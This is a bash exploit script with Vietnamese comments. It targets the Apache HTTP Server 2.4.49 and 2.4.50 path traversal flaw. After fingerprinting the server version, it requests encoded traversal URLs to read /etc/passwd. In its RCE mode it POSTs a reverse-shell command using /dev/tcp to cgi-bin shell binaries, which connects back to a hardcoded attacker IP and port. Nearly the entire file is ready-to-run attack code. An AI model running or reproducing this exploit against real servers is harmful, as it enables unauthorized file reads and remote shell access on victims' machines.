# @Author   Vu
# Alias     Bblack
# Use: ./exploit.sh -u <urrl> [OPTIONS]
#       OPTIONS:    -t:    path travesal
#                   -r:     rce
#                   -i:     ip
#                   -p:     port

#!/bin/bash

URL=""
PT=0
R=0
IP="192.168.1.12"
PORT="4444"


while getopts "u:tr" opt; do
    case "$opt" in
        u)  URL=$OPTARG;;
        t)  PT=1;;
        r)  R=1;;
        *)  echo "./exploit.sh -u <url> [options]"
            exit 1
    esac
done

if [[ $PT -eq 0  &&  $R -eq 0 ]] || [[ $PT -eq 1 && $R -eq 1 ]] ; then
    echo "Can chi dinh 1 tham so -t hoac -r"
    exit 1
fi

response=$(curl -s -i -H 'User-Agent: Mozilla/5.0' "$URL")

if [[ -n "$response" ]]; then

    if [[ $PT -eq 1 ]] ; then
        
        if echo "$response" | grep -q "2.4.49" ; then
            payload="$URL/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' "$payload")
            if echo "$res" | grep -q "root:" ; then
                echo "Path Traversal Attack Apache 2.4.49"
            else
                echo "Chua phat hien $URL co lo hong Path Traversal"
            fi
            exit 0
        elif echo "$response" | grep -q "2.4.50" ; then
            payload="$URL/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' "$payload")
            if echo "$res" | grep -q "root:" ; then
                echo "Path Traversal Attack Apache 2.4.50"
            else
                echo "Chua phat hien $URL co lo hong Path Traversal"
            fi
            exit 0
        else
            payload="$URL/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' "$payload")
            if echo "$res" | grep -q "root:" ; then
                echo "Path Traversal Attack Apache 2.4.49"
                exit 0
            else
                payload="$URL/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
                res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' "$payload")
                if echo "$res" | grep -q "root:" ; then
                    echo "Path Traversal Attack Apache 2.4.50"
                    exit 0
                fi
            fi
            echo "Khong phat hien Path Travelsal"
            exit 0
        fi
    elif [[ $R -eq 1 ]] ; then
        echo "$IP"
        echo "$PORT"
        if [[ -z "$PORT" || -z "$IP" ]] ; then
            echo "port hoac IP khong hop le"
            exit 1
        fi
        #nc -nlvp "$PORT"  &
        sleep 2
        data="/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1"
        if echo "$response" | grep -q "2.4.49" ; then
            payload="$URL/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' --data "$data" "$payload")
            
        elif echo "$response" | grep -q "2.4.50"; then
            payload="$URL/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' --data "$data" "$payload")
            
        else
            payload="$URL/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' --data "$data" "$payload")
            echo "3"
            
            if [[ -z $res ]] ; then 
                payload="$URL/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
                res=$(curl -s --path-as-is -H 'User-Agent: Mozilla/5.0' --data "$data" "$payload")
               
            fi
        fi
    fi
fi
